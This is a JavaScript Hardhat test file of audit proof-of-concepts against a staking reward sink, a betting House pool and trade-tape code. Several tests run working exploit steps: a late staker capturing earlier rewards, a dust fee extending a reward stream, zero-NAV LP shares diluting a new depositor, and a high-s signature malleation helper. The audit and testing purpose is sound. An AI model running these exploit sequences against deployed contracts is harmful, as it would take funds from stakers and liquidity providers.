const assert = require("assert");
const { ethers, U, E18, X, makeWorld, now, warp } = require("./runtime.cjs");
const { BinanceVenue, HyperliquidVenue } = require("../../engine/venues/live.js");
const { TradeTape } = require("../../engine/venues/base.js");
const { EpochLedger } = require("../../engine/ledger.js");

const DAY = 86_400;
let checks = 0;
function ok(condition, message) {
  assert(condition, message);
  checks++;
  console.log(`  PASS ${message}`);
}
async function mustReject(promise, part) {
  let error;
  try { await promise; } catch (e) { error = e; }
  assert(error, `expected rejection containing ${part}`);
  assert(String(error.message).includes(part), `expected ${part}, got ${error.message}`);
}
function isqrt(x) {
  if (x < 0n) throw new Error("sqrt negative");
  if (x < 2n) return x;
  let a = 1n << (BigInt(x.toString(2).length) / 2n + 1n);
  let b = (a + x / a) / 2n;
  while (b < a) { a = b; b = (a + x / a) / 2n; }
  return a;
}

async function lateStakerHandoff() {
  console.log("\n[POC-01] unfinished stream after the last staker exits");
  const W = await makeWorld({ withOptions: false });
  await (await W.sink.connect(W.honest).stake(E18(1_000))).wait();
  await (await W.house.connect(W.lp).lpDeposit(U(100_000))).wait();
  const id = await W.buyHouse(W.p1, U(10_000), 2);
  await W.settleHouse(id, 1); // founder unset: 399 USDC enters the staker stream
  ok(await W.usdc.balanceOf(W.sA) === U(399), "399 USDC was notified while the honest staker was active");

  await (await W.sink.connect(W.honest).requestUnbond(E18(1_000))).wait();
  ok(await W.sink.totalStaked() === 0n, "the only original staker exited");
  const pausedFinish = await W.sink.periodFinish();
  await warp(30 * DAY);
  await (await W.sink.connect(W.attacker).stake(1n)).wait();
  const resumedFinish = await W.sink.periodFinish();
  ok(resumedFinish > pausedFinish + 29n * BigInt(DAY), "an empty 30-day interval extended, rather than expired, the old stream");
  ok(await W.sink.claimable(W.attacker.address) < U(1), "the late staker did not receive everything instantly");

  await warp(7 * DAY + 60);
  const before = await W.usdc.balanceOf(W.attacker.address);
  await (await W.sink.connect(W.attacker).claimReward()).wait();
  const received = (await W.usdc.balanceOf(W.attacker.address)) - before;
  console.log(`  FACT late staker received ${ethers.formatUnits(received, 6)} USDC from the old 399-USDC notification`);
  ok(received > U(398), "late staker captured almost all revenue notified before they staked");
}

async function rollingTinyNotification() {
  console.log("\n[POC-02] rolling stream extension from a real one-base-unit House fee");
  const W = await makeWorld({ withOptions: false });
  await (await W.sink.connect(W.honest).stake(E18(1_000))).wait();
  await (await W.house.connect(W.lp).lpDeposit(U(10_000))).wait();
  const initial = await W.buyHouse(W.p1, 2_506_265_665n, 2);
  await W.settleHouse(initial, 1);
  ok(await W.usdc.balanceOf(W.sA) === U(100), "the first settled win streamed exactly 100 USDC");
  const originalFinish = await W.sink.periodFinish();
  await warp(DAY);
  const tiny = await W.buyHouse(W.p1, 520n, 1.05); // gross profit = 26 base units
  const rc = await W.settleHouse(tiny, 1);
  const fee = rc.logs.find((l) => l.fragment?.name === "Settled").args.feeTaken;
  ok(fee === 1n && await W.usdc.balanceOf(W.sA) === U(100) + 1n,
    "a 520-base-unit 1.05x winning ticket streamed a one-base-unit fee");
  const rolledFinish = await W.sink.periodFinish();
  ok(rolledFinish > originalFinish, "one base unit moved periodFinish to now + seven days");
  const remainingWarp = Number(originalFinish) - (await now()) + 1;
  if (remainingWarp > 0) await warp(remainingWarp);
  const atOriginalFinish = await W.sink.claimable(W.honest.address);
  console.log(`  FACT at the original finish, claimable=${ethers.formatUnits(atOriginalFinish, 6)} / 100 USDC; new finish=${rolledFinish}`);
  ok(atOriginalFinish < U(99), "the tiny notification delayed more than 1 USDC of the original stream");
}

async function zeroAddressAttester() {
  console.log("\n[POC-03] zero-address attester configuration is rejected");
  const W = await makeWorld({ withOptions: false, seedDiamond: false });
  await mustReject(W.ov.connect(W.owner).setAttester(ethers.ZeroAddress, true), "zero");
  ok(!(await W.ov.isAttester(ethers.ZeroAddress)), "owner cannot enable a zero-recovering attester");
}

async function earlyOutcomeSettlement() {
  console.log("\n[POC-04] House WON settlement before expiry (documented oracle trust boundary)");
  const W = await makeWorld({ withOptions: false, seedDiamond: false });
  await (await W.house.connect(W.lp).lpDeposit(U(100_000))).wait();
  const id = await W.buyHouse(W.p1, U(100), 2, 300);
  const t = await W.house.tickets(id);
  const settled = await W.settleHouse(id, 1);
  const block = await settled.getBlock();
  ok(BigInt(block.timestamp) < t.expiry, "two attester signatures settled WON before ticket expiry");
}

async function hyperliquidSameTimestamp() {
  console.log("\n[POC-05] Hyperliquid recentTrades with identical millisecond timestamps");
  const venue = new HyperliquidVenue();
  venue._post = async () => [
    { tid: 2, time: 1_000, px: "101", sz: "2" },
    { tid: 1, time: 1_000, px: "100", sz: "3" },
  ];
  const tape = venue.startTape("HYPE", { pollMs: 1_000_000 });
  await new Promise((resolve) => setTimeout(resolve, 20));
  tape.stop();
  console.log(`  FACT retained trades=${tape.trades.length}, payload=${JSON.stringify(tape.trades)}`);
  ok(tape.trades.length === 2 && tape.vwap(1_000, 1_000).qty === 5,
    "ID-based dedupe retains both distinct same-millisecond trades");
}

async function binanceOverlappingPolls() {
  console.log("\n[POC-06] Binance overlapping polls and aggregate-trade deduplication");
  const venue = new BinanceVenue(), originalFetch = global.fetch;
  let initialCalls = 0;
  global.fetch = async (url) => {
    if (String(url).includes("fromId=")) return { ok: true, json: async () => [] };
    initialCalls++;
    await new Promise((resolve) => setTimeout(resolve, 25));
    return { ok: true, json: async () => [{ T: 1_000, p: "100", q: "2", a: 7 }] };
  };
  const tape = venue.startTape("BTC", { pollMs: 5 });
  await new Promise((resolve) => setTimeout(resolve, 70));
  tape.stop();
  await new Promise((resolve) => setTimeout(resolve, 40));
  global.fetch = originalFetch;
  console.log(`  FACT identical trade responses=${initialCalls}, retained prints=${tape.trades.length}, VWAP quantity=${tape.vwap(1_000, 1_000).qty}`);
  ok(initialCalls === 1 && tape.trades.length === 1, "single-flight prevents overlapping initial snapshots");
  ok(tape.vwap(1_000, 1_000).qty === 2, "aggTrade ID dedupe preserves the real quantity");
}

async function blockedRevenueSink() {
  console.log("\n[POC-08] blocklisted/non-pulling revenue sink versus clean-book WON settlement");
  const W = await makeWorld({ withOptions: false, blocklist: true });
  await (await W.sink.connect(W.honest).stake(E18(1_000))).wait();
  await (await W.house.connect(W.lp).lpDeposit(U(1_000))).wait();
  await (await W.usdc.connect(W.owner).setBlocked(W.sA, true)).wait();
  const id = await W.buyHouse(W.p1, U(100), 2);
  await W.settleHouse(id, 1);
  const t = await W.house.tickets(id), gross = (t.multX1e4 - 10_000n) * t.stake / 10_000n;
  const fee = gross * 399n / 10_000n;
  ok(t.outcome === 1n && await W.house.pool() === U(1_000) - (gross - fee) && await W.usdc.balanceOf(W.sA) === 0n,
    "a blocked sink retains its fee in pool without reverting WON settlement");
  ok(await W.usdc.allowance(W.hA, W.sA) === 0n && await W.house.lanesIntact(),
    "failed sink notification leaves no allowance and preserves token lanes");
}

async function zeroNavRecapitalization() {
  console.log("\n[POC-07] zero-NAV LP shares revive on a later LP's recapitalization");
  const W = await makeWorld({ withOptions: false, seedDiamond: false });
  await (await W.house.connect(W.lp).lpDeposit(U(1_000))).wait();
  const oldShares = await W.house.lpShares(W.lp.address);
  await (await W.house.connect(W.lp).lpRequestExit(oldShares)).wait();
  const first = await W.buyHouse(W.p1, U(1_000), 2);
  await W.settleHouse(first, 1); // no stakers: the fee remains as 39.9 USDC of pool
  const second = await W.buyHouse(W.p1, U(100), 2);
  await W.settleHouse(second, 1); // drains the remaining pool; deferred winner debt stays
  ok(await W.house.pool() === 0n && await W.house.totalShares() === oldShares,
    "old LP shares remain outstanding after pool NAV reaches zero");
  await warp(7 * DAY + 60);
  let navError = null;
  try { await W.house.connect(W.lp).lpWithdraw.staticCall(); } catch (e) { navError = e.reason || e.shortMessage || e.message; }
  ok(navError && navError.includes("nav empty"), "matured old LP exit cannot withdraw at zero NAV before recapitalization");

  await (await W.house.connect(W.p5).lpDeposit(U(1_000))).wait();
  const oldBefore = await W.usdc.balanceOf(W.lp.address);
  await (await W.house.connect(W.lp).lpWithdraw()).wait();
  const oldGot = (await W.usdc.balanceOf(W.lp.address)) - oldBefore;
  await (await W.house.connect(W.p5).lpRequestExit(await W.house.lpShares(W.p5.address))).wait();
  await warp(7 * DAY + 60);
  const newBefore = await W.usdc.balanceOf(W.p5.address);
  await (await W.house.connect(W.p5).lpWithdraw()).wait();
  const newGot = (await W.usdc.balanceOf(W.p5.address)) - newBefore;
  console.log(`  FACT old LP recovered ${ethers.formatUnits(oldGot, 6)}; new 1,000-USDC LP recovered ${ethers.formatUnits(newGot, 6)}`);
  ok(oldGot > U(499) && newGot < U(501), "old zero-NAV shares take about half of the new LP's 1,000-USDC deposit");
}

async function signatureMalleabilityNegative() {
  console.log("\n[POC-09] high-s quote replay and duplicate-attester malleability (negative test)");
  const W = await makeWorld({ withOptions: false, seedDiamond: false });
  const { q, sig } = await W.quoteHouse(W.p1, U(100), 2, 60, ethers.randomBytes(32));
  const malleate = (s) => {
    const p = ethers.Signature.from(s);
    const N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141n;
    return ethers.concat([p.r, ethers.zeroPadValue(ethers.toBeHex(N - BigInt(p.s)), 32), ethers.toBeHex(p.v === 27 ? 28 : 27, 1)]);
  };
  await (await W.house.connect(W.p1).buyTicket(q, sig, X(2), 60)).wait();
  await mustReject(W.house.connect(W.p1).buyTicket.staticCall(q, malleate(sig), X(2), 60), "quote used");
  ok(true, "a high-s encoding of an already consumed quote still reverts quote used");
  const sigs = await W.signOutcome(0n, 1);
  ok(await W.ov.verify(0n, 1, sigs), "two distinct real attesters form a quorum");
  ok(!(await W.ov.verify(0n, 1, [sigs[0], malleate(sigs[0])])),
    "two encodings of the same attester signature do not form a quorum");
}

async function malformedTapeAndWeightPrecision() {
  console.log("\n[POC-10] tape input validation and ledger numeric precision");
  const tape = new TradeTape();
  tape.add(1_000, 100, 0);
  const v = tape.vwap(1_000, 1_000);
  ok(v === null && tape.trades.length === 0, "a zero-quantity print is rejected as NO-PRINT");

  let maxAbs = 0n, maxRel = 0, maxCase = null;
  for (const scale of [1, 1_000, 1_000_000, 1_000_000_000]) {
    for (const n of [1, 3, 7, 99, 1_001]) {
      const loss = U(scale * n), fees = loss / 25n + 1n;
      const L = new EpochLedger();
      L.add({ owner: "0x0000000000000000000000000000000000000001", ts: 0, stake: loss, payout: 0n, feePaid: fees });
      const { rows } = L.weights(0);
      const current = BigInt(Math.round(rows[0].w * 1e9));
      const exactFloor = isqrt(loss * fees * 10n ** 18n);
      const diff = current > exactFloor ? current - exactFloor : exactFloor - current;
      const rel = Number(diff) / Number(exactFloor);
      if (diff > maxAbs) { maxAbs = diff; maxCase = { scale, n, current: current.toString(), exactFloor: exactFloor.toString() }; }
      if (rel > maxRel) maxRel = rel;
    }
  }
  console.log(`  FACT weight-w9 max relative error=${maxRel}; max case=${JSON.stringify(maxCase)}`);
  ok(maxRel < 1e-9, "tested ledger scales did not produce a material Number-precision allocation error");
}

(async () => {
  await lateStakerHandoff();
  await rollingTinyNotification();
  await zeroAddressAttester();
  await earlyOutcomeSettlement();
  await hyperliquidSameTimestamp();
  await binanceOverlappingPolls();
  await zeroNavRecapitalization();
  await blockedRevenueSink();
  await signatureMalleabilityNegative();
  await malformedTapeAndWeightPrecision();
  console.log(`\n==== hardhat attack PoCs: ${checks} checks passed ====`);
})().catch((e) => { console.error(e); process.exit(1); });
